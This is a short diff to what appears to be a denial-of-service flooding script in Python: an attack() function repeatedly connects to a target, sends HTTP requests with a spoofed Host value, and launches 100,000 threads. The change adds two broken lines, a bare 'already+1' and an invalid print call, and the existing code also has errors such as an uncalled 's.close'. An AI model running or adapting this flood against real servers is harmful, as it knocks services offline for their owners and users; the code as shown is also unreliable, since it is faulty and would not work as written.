@@ -13,6 +13,8 @@ def attack():
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "r\n\r\n").encode('ascii'), (target, port))
+        already+1
+        print(already = "packets sending")
         s.close
         for i in range(100000):
             thread = threading.Thread(target=attack)
